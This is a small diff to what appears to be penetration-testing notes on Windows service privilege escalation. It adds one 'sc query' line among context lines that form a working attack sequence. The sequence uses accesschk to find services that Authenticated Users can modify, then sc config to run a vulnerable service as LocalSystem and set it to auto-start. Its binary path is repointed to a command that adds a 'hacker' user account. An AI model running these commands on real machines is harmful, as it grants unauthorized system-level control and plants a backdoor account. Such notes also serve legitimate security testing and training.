@@ -1,6 +1,7 @@
 Vulnerable Services
     $ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
     $ sc qc <[VULNERABLE_SERVICE]>
+    $ sc query <[VULNERABLE_SERVICE]>
     $ sc config <[VULNERABLE_SERVICE]> obj= ".\LocalSystem" password= ""
     $ sc config <[VULNERABLE_SERVICE]> start= "auto"
     $ sc config <[VULNERABLE_SERVICE]> binpath= "net user hacker Hacker123 /add"
